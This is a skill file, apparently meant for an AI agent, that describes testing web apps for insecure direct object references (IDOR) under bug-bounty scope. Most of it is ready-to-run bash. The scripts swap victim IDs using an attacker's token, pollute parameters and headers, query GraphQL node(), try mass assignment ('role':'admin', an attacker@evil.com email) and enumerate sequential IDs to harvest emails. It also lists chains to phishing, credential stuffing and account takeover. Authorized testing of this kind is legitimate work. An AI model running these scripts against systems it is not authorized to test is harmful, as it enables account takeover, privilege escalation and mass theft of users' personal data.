---
name: web-vuln-idor
description: IDOR vulnerability detection with V1-V8 variant classification and chain escalation paths
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects Insecure Direct Object Reference (IDOR) vulnerabilities across 8 variant classifications (V1–V8), covering numeric IDs, UUID-based references, indirect parameters, GraphQL node() queries, WebSocket messages, file path references, API version downgrades, and mass assignment. Provides systematic two-account testing, impact classification, and chain escalation paths from IDOR to PII leak, ATO, and privilege escalation.

## When to use

- When an endpoint URL or request body contains an ID parameter (numeric, UUID, base64, or encoded)
- When testing access control between two user accounts of the same or different roles
- When an API version endpoint exists alongside a newer one
- When GraphQL introspection reveals a `node()` query
- When a WebSocket message contains a client-supplied user or resource identifier
- When a file download endpoint includes a filename or path in the request

## Prerequisites

- Two valid accounts on the target: Account A (attacker) and Account B (victim)
- A proxy tool (Burp Suite or Caido) configured to intercept requests
- Both accounts must have performed at least one action that creates a resource (order, report, profile, message)
- Authorization to test the target under a valid bug bounty or pentest scope

## Inputs

| Variable | Required | Description |
|----------|----------|-------------|
| `SECSKILL_TARGET` | Yes | Base URL of the target (e.g., `https://app.example.com`) |
| `SECSKILL_TOKEN_A` | Yes | Bearer token or session cookie for Account A (attacker) |
| `SECSKILL_TOKEN_B` | Yes | Bearer token or session cookie for Account B (victim) |
| `SECSKILL_RESOURCE_ID` | Yes | A resource ID owned by Account B (order_id, user_id, report_id, etc.) |
| `SECSKILL_ENDPOINT` | Yes | Endpoint containing the object reference (e.g., `/api/orders/`) |
| `SECSKILL_OUTPUT_DIR` | Optional | Directory to save results (default: `./output`) |

## Workflow

### Step 1: Environment setup and variant identification

```bash
export TARGET="${SECSKILL_TARGET}"
export TOKEN_A="${SECSKILL_TOKEN_A}"
export TOKEN_B="${SECSKILL_TOKEN_B}"
export VICTIM_ID="${SECSKILL_RESOURCE_ID}"
export ENDPOINT="${SECSKILL_ENDPOINT}"
export OUTDIR="${SECSKILL_OUTPUT_DIR:-./output}"
mkdir -p "$OUTDIR"

# Classify the ID format — determines which variants to test
if echo "$VICTIM_ID" | grep -qE '^[0-9]+$'; then
  echo "[*] Numeric ID detected -> V1 (direct swap), V7 (API version), V8 (mass assignment)"
elif echo "$VICTIM_ID" | grep -qE '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'; then
  echo "[*] UUID detected -> V2 (need leak source), V3 (parameter pollution), V8 (mass assignment)"
elif echo "$VICTIM_ID" | grep -qE '^[A-Za-z0-9+/=]{20,}$'; then
  echo "[*] Base64/encoded ID detected -> V2 (decode and swap)"
  echo "$VICTIM_ID" | base64 -d 2>/dev/null && echo ""
fi

# Confirm Account A cannot legitimately access Account B's resource
echo "[*] Baseline: Account A's own resource access"
curl -sk -H "Authorization: Bearer $TOKEN_A" \
  "${TARGET}${ENDPOINT}" -w "\nHTTP: %{http_code}\n" | tail -3

echo "[*] Baseline: Account B owns the target resource (verify 200)"
curl -sk -H "Authorization: Bearer $TOKEN_B" \
  "${TARGET}${ENDPOINT}${VICTIM_ID}" -w "\nHTTP: %{http_code}\n" | tail -3
```

### Step 2: V1 — Direct numeric ID swap

```bash
echo "=== V1: Direct Object Reference ==="
# Use Account A's token to access Account B's resource
RESPONSE=$(curl -sk -H "Authorization: Bearer $TOKEN_A" \
  "${TARGET}${ENDPOINT}${VICTIM_ID}" \
  -o "$OUTDIR/v1_response.json" -w "%{http_code}")

echo "HTTP Status: $RESPONSE"

if [ "$RESPONSE" = "200" ]; then
  echo "[!] POTENTIAL IDOR V1 — got 200 with Account A token on Account B resource"
  # Check if response contains Account B's actual data
  python3 -c "
import json, sys
try:
    with open('$OUTDIR/v1_response.json') as f:
        data = json.load(f)
    print('Response keys:', list(data.keys()) if isinstance(data, dict) else type(data).__name__)
    print('First 300 chars:', str(data)[:300])
except: print('Non-JSON response')
"
else
  echo "[-] V1: Got $RESPONSE — access denied (check V3/V4/V7 variants)"
fi

# Test all HTTP methods — PUT and DELETE often lack auth checks
echo ""
echo "[*] Testing all HTTP methods for V1"
for method in GET POST PUT PATCH DELETE; do
  code=$(curl -sk -X "$method" \
    -H "Authorization: Bearer $TOKEN_A" \
    "${TARGET}${ENDPOINT}${VICTIM_ID}" \
    -w "%{http_code}" -o /dev/null)
  echo "  $method: $code"
done
```

### Step 3: V2 — Encoded/hashed ID swap

```bash
echo "=== V2: Indirect Reference (Encoded/Hashed IDs) ==="

# Find UUID or GUID from Account B via indirect endpoints (email invite, share links)
# Common UUID leak sources:
echo "[*] Checking for UUID leak in Account B's shareable links or email headers"
for leak_path in /api/users/search /api/invites /api/share /api/export \
                 /api/profile/public /api/notifications; do
  code=$(curl -sk -o "$OUTDIR/leak_probe.json" -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" "${TARGET}${leak_path}")
  [ "$code" = "200" ] && echo "  [200] $leak_path — check for UUIDs" && \
    grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
    "$OUTDIR/leak_probe.json" | head -3
done

# If ID is base64-encoded, decode -> modify -> re-encode
if echo "$VICTIM_ID" | base64 -d 2>/dev/null | grep -qE '^[A-Za-z]+:[0-9]+$'; then
  DECODED=$(echo "$VICTIM_ID" | base64 -d 2>/dev/null)
  echo "[*] Decoded ID: $DECODED"
  # Modify the numeric part — e.g., User:456 -> User:457
  MODIFIED=$(echo "$DECODED" | sed 's/:[0-9]*/:'$(( $(echo "$DECODED" | grep -oE '[0-9]+') + 1 ))'/')
  NEW_ID=$(echo -n "$MODIFIED" | base64)
  echo "[*] Testing modified encoded ID: $NEW_ID"
  curl -sk -H "Authorization: Bearer $TOKEN_A" \
    "${TARGET}${ENDPOINT}${NEW_ID}" -w "\nHTTP: %{http_code}\n" | tail -3
fi
```

### Step 4: V3 — Parameter pollution

```bash
echo "=== V3: Parameter Pollution ==="
# Add unexpected parameters that override the server-side user lookup

# Test 1: Add user_id / owner_id as query parameter
for param in user_id userId owner_id ownerId account_id uid; do
  code=$(curl -sk -o "$OUTDIR/v3_${param}.json" -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "${TARGET}${ENDPOINT}?${param}=${VICTIM_ID}")
  echo "  ?${param}=${VICTIM_ID} -> HTTP $code"
  [ "$code" = "200" ] && echo "  [!] POTENTIAL V3 IDOR via ?${param}"
done

# Test 2: Override in JSON body
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  "${TARGET}${ENDPOINT}" \
  -d "{\"id\": \"${VICTIM_ID}\", \"user_id\": \"${VICTIM_ID}\"}" \
  -w "\nHTTP: %{http_code}\n" | tail -3

# Test 3: HTTP header injection
for header in "X-User-Id: ${VICTIM_ID}" "X-Account-Id: ${VICTIM_ID}" \
              "X-Real-User: ${VICTIM_ID}" "X-Original-User: ${VICTIM_ID}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "$header" \
    "${TARGET}${ENDPOINT}")
  echo "  Header '$header' -> HTTP $code"
done
```

### Step 5: V4 — GraphQL node() IDOR

```bash
echo "=== V4: GraphQL node() IDOR ==="
# GraphQL node() queries often bypass per-type authorization

# Check if GraphQL is available
GQL_URL="${TARGET}/graphql"
code=$(curl -sk -o /dev/null -w "%{http_code}" "$GQL_URL")
echo "[*] GraphQL endpoint: HTTP $code"

if [ "$code" = "200" ] || [ "$code" = "400" ]; then
  # Introspect to find node() and types with sensitive fields
  curl -sk -X POST "$GQL_URL" \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __schema { queryType { fields { name args { name } } } } }"}' \
    | python3 -m json.tool 2>/dev/null | grep -A2 '"name": "node"'

  # If VICTIM_ID is numeric, encode as base64 GlobalID (Type:ID)
  for type_name in User Order Report Invoice Payment Admin; do
    GLOBAL_ID=$(echo -n "${type_name}:${VICTIM_ID}" | base64)
    echo "[*] Testing node(id: $GLOBAL_ID) for type $type_name"
    curl -sk -X POST "$GQL_URL" \
      -H "Authorization: Bearer $TOKEN_A" \
      -H "Content-Type: application/json" \
      -d "{\"query\": \"{ node(id: \\\"${GLOBAL_ID}\\\") { id ... on ${type_name} { email name } } }\"}" \
      -o "$OUTDIR/graphql_node_${type_name}.json" -w "HTTP: %{http_code}\n"
    grep -E '"email"|"name"|"phone"' "$OUTDIR/graphql_node_${type_name}.json" 2>/dev/null && \
      echo "[!] POTENTIAL V4 GraphQL IDOR — sensitive fields returned"
  done
fi
```

### Step 6: V5/V6/V7 — WebSocket, file path, and API version IDOR

```bash
echo "=== V5: WebSocket IDOR ==="
# Test if WebSocket messages accept client-supplied user IDs
# (Requires wscat: npm install -g wscat)
WS_URL=$(echo "$TARGET" | sed 's/https/wss/;s/http/ws/')/ws
echo "[*] Testing WebSocket IDOR at $WS_URL"
echo '{"action":"get_history","userId":"'"${VICTIM_ID}"'"}' | \
  timeout 5 wscat -c "$WS_URL" \
  -H "Authorization: Bearer $TOKEN_A" 2>/dev/null | head -5 || \
  echo "  wscat not available or WS not present — skip"

echo ""
echo "=== V6: File Path IDOR ==="
# Test file download endpoints with path traversal or direct path injection
for path_variant in \
  "/api/files/${VICTIM_ID}" \
  "/api/exports/${VICTIM_ID}.csv" \
  "/api/reports/${VICTIM_ID}/download" \
  "/uploads/${VICTIM_ID}" \
  "/api/attachments?file=${VICTIM_ID}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "${TARGET}${path_variant}")
  [ "$code" = "200" ] && echo "[!] [200] V6 candidate: $path_variant"
done

echo ""
echo "=== V7: API Version Downgrade IDOR ==="
# Old API versions frequently lack auth checks added in newer versions
BASE_PATH=$(echo "$ENDPOINT" | sed 's|/v[0-9]*/||')
for version in v1 v2 v3 v0 api; do
  for path_try in \
    "/${version}/${BASE_PATH}${VICTIM_ID}" \
    "/api/${version}/${BASE_PATH}${VICTIM_ID}"; do
    code=$(curl -sk -o "$OUTDIR/v7_${version}.json" -w "%{http_code}" \
      -H "Authorization: Bearer $TOKEN_A" \
      "${TARGET}${path_try}")
    [ "$code" = "200" ] && echo "[!] V7 — older version accessible: ${TARGET}${path_try} (HTTP $code)"
    [ "$code" != "404" ] && [ "$code" != "200" ] && \
      echo "  ${path_try} -> HTTP $code"
  done
done
```

### Step 7: V8 — Mass assignment IDOR

```bash
echo "=== V8: Mass Assignment IDOR ==="
# Mass assignment allows setting fields the developer didn't intend to expose

# Test profile/update endpoints with unexpected privileged fields
for field_set in \
  '{"role":"admin"}' \
  '{"is_admin":true,"role":"admin"}' \
  '{"plan":"enterprise","tier":"admin"}' \
  '{"subscription":"premium","credits":9999}' \
  '{"user_id":"'"${VICTIM_ID}"'","email":"attacker@evil.com"}'; do
  code=$(curl -sk -X PUT \
    -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" \
    "${TARGET}/api/user/profile" \
    -d "$field_set" \
    -o "$OUTDIR/v8_mass_assign.json" -w "%{http_code}")
  echo "  PUT /api/user/profile $field_set -> HTTP $code"
  # Check if role change reflected
  [ "$code" = "200" ] && grep -E '"role"|"is_admin"|"admin"' \
    "$OUTDIR/v8_mass_assign.json" 2>/dev/null && \
    echo "  [!] POTENTIAL V8 — privileged field accepted"
done
```

### Step 8: Impact assessment and chain escalation

```bash
echo "=== Impact Assessment and Chain Escalation ==="

# After confirming IDOR, assess escalation potential
cat <<'EOF'
IDOR Impact Classification:
  Read PII (name, email, address)         -> Medium
  Read financial data (orders, payments)  -> High
  Write/modify another user's data        -> High
  Change another user's email/password    -> Critical (ATO)
  Access admin endpoint                   -> Critical (privilege escalation)

Chain escalation paths:
  IDOR + read email address  -> phishing / credential stuffing
  IDOR + write email field   -> ATO (change victim email, trigger password reset)
  IDOR + admin endpoint      -> escalate to admin ATO
  IDOR + PII at scale        -> prove mass data exposure (loop 20 IDs)
  IDOR + chatbot context     -> AI reads other users' conversation history
EOF

# Prove scale: enumerate 20 sequential IDs to show mass impact
echo ""
echo "[*] Enumerating 20 sequential IDs to demonstrate scale..."
BASE_ID=$(echo "$VICTIM_ID" | grep -oE '^[0-9]+' || echo "100")
for id in $(seq "$BASE_ID" $(( BASE_ID + 19 ))); do
  result=$(curl -sk -H "Authorization: Bearer $TOKEN_A" \
    "${TARGET}${ENDPOINT}${id}" \
    -w "%{http_code}" -o /tmp/idor_enum.json)
  if [ "$result" = "200" ]; then
    summary=$(python3 -c "
import json
try:
    d = json.load(open('/tmp/idor_enum.json'))
    print(d.get('email','') or d.get('name','') or str(d)[:60])
except: print('non-json')
" 2>/dev/null)
    echo "  ID $id: [200] $summary"
  fi
done
echo "[*] Enumeration complete. Results in $OUTDIR/"
```

## Done when

- At least one IDOR variant (V1–V8) is confirmed with HTTP 200 returning Account B's data using Account A's token
- The variant is classified and documented with the specific endpoint, HTTP method, and parameter name
- Impact is assessed (read/write, PII/financial/admin)
- Chain escalation potential is evaluated (can IDOR lead to ATO or privilege escalation?)
- A reproducible curl command is captured for the bug report
- Scale is demonstrated by enumerating multiple IDs (for Medium → High escalation)

## Failure modes

| Symptom | Cause | Resolution |
|---------|-------|------------|
| All endpoints return 403 | Proper authorization in place for V1 | Test V3 (parameter pollution), V4 (GraphQL), V7 (old API version) |
| IDs are UUIDs, can't enumerate | No predictable IDs | Find UUID leak: email invites, share links, API responses to other features |
| 200 response but returns own data | Server ignores the ID param, returns session data | Try explicit query param override, check V3 variants |
| Response is identical for both tokens | Endpoint uses session-based data only | Look for other endpoints with explicit ID references in URL path |
| GraphQL returns `null` for node() | Per-node auth configured correctly | Try different type names (User, Admin, Order, Invoice) |
| Mass assignment fields rejected | Server uses allowlist | Check JS source for full object schema, try nested field injection |
| WebSocket test fails | wscat unavailable or WS endpoint differs | Use Burp's WebSocket history tab to capture and replay messages manually |

## Notes

- IDOR is the most commonly paid bug class — roughly 30% of paid web submissions.
- Always test every HTTP method (GET, PUT, DELETE, PATCH) — DELETE endpoints are the most frequently unprotected.
- UUID-based IDs are not security controls. The UUID must still be tied to an authorization check server-side.
- V7 (API version downgrade) is highly valuable: `/api/v1/` endpoints are often forgotten and lack the auth middleware added in v2.
- For GraphQL V4, the `node()` interface bypasses per-type resolvers and applies only a global relay authorization — this is frequently misconfigured.
- Chain IDOR with PII exfiltration at scale to escalate from Medium to High severity.
- Chain IDOR with email/password field write to demonstrate ATO for Critical severity.
